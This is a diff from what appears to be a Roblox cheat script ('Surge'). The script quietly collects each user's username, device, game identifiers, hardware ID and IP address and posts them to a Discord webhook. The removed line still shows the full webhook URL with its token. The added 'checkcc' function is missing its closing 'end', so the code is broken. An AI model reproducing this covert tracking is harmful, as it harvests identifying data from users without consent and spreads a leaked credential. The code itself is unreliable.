@@ -338,6 +338,9 @@ task.spawn(function()
         return response.Body
     end
 
+    local function checkcc()
+        return "wow"..identifyexecutor()
+
     local function kaka()
         if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
             return "Mobile"
@@ -366,9 +369,9 @@ task.spawn(function()
         return result
     end
 
-    local message = "Device -> "..kaka().."\nUser -> "..game.Players.LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId
+    local message = "Device -> "..kaka().."\nUser -> "..game.Players.LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId.."\nkaka ->"..checkcc()
     local options = {
-        Url = "https://discord.com/api/webhooks/1346461273788776491/dMIzANj4f4Uf42nvNyS2sZ-HKDGen54-OwjF-QOwaB3Z6nTIVnx1xndrGrjIc3aqYRBX",
+        Url = "",
         Body = HttpService:JSONEncode({
             ['content'] = tostring(message),
             ['username'] = "Surge User "..gethwid().." "..getip()--(game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()).Name
